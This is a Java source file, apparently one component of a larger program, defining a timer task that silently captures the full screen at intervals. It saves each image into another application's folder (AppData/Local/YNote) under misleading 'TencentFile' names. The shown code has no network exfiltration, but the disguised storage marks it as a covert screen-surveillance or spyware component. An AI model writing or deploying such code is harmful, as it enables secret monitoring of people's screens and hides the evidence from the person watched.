package com.eko.task;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.TimerTask;

import javax.imageio.ImageIO;

import com.eko.common.Utils;

public class SnapShot extends TimerTask {
	
	final String imgPath = System.getProperty("user.home")
			+ "/AppData/Local/YNote/";
	Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();

	@Override
	public void run() {
		// TODO Auto-generated method stub
		snapShot();
	}

	public void snapShot() {
		 
		FileInputStream input = null;
		try {
			// 拷贝屏幕到一个BufferedImage对象screenshot
			BufferedImage screenshot = (new Robot())
					.createScreenCapture(new Rectangle(0, 0, (int) dimension
							.getWidth(), (int) dimension.getHeight()));

			// 根据文件前缀变量和文件格式变量，自动生成文件名
			String name = imgPath + "TencentFile-" + Utils.getInstance().getCurrentTime() + ".jpg";
			String shortx = "TencentFile-" + Utils.getInstance().getCurrentTime() + ".jpg";
			File f = new File(name);

			// 将screenshot对象写入图像文件
			ImageIO.write(screenshot, "jpg", f);
			System.out.println("Save File " + name);
		} catch (IOException | AWTException ex) {
			ex.printStackTrace();
		} finally {
			input = null;
		}
	
	}
	
}
